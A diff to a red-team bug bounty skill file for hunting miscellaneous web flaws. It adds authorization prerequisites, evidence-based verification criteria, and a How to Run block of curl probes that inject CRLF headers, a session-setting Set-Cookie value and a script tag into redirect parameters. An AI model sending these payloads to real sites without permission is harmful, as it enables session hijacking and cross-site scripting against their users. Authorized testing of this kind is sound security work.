@@ -4,9 +4,40 @@ description: Hunting skill for misc vulnerabilities. Built from 225 public bug b
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [misc, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [misc, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting misc on any target.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `dig`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Test CRLF in header values
+curl --max-time 30 --connect-timeout 10 -v "https://target.com/path" \
+  -H $'X-Custom: value\r\nInjected-Header: evil'
+
+# URL-encoded variant
+curl --max-time 30 --connect-timeout 10 -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"
+
+# Test in pitchfork/Rack apps — inject via query param reflected in Location header
+curl --max-time 30 --connect-timeout 10 -v "https://shop.[SHOPIFY_STORE]/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -326,35 +357,19 @@ When you confirm a misc primitive at A, **immediately** ask: what state-machine,
 
 ---
 
-## Verification
-
-Run this self-test to confirm misc hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-misc" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Testing too broadly** — "misc" is a catch-all, not a methodology. Pick a specific bug class and go deep.
 - **Reporting informational findings as Medium** — missing security headers (CSP, HSTS), cookie flags (HttpOnly, Secure), and directory listing are informational.
 - **Version disclosure without CVE** — knowing the server version without a matching CVE is not a vulnerability.
 - **HTTP methods enabled without impact** — OPTIONS, TRACE, PUT, DELETE enabled but restricted to harmless endpoints are informational.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
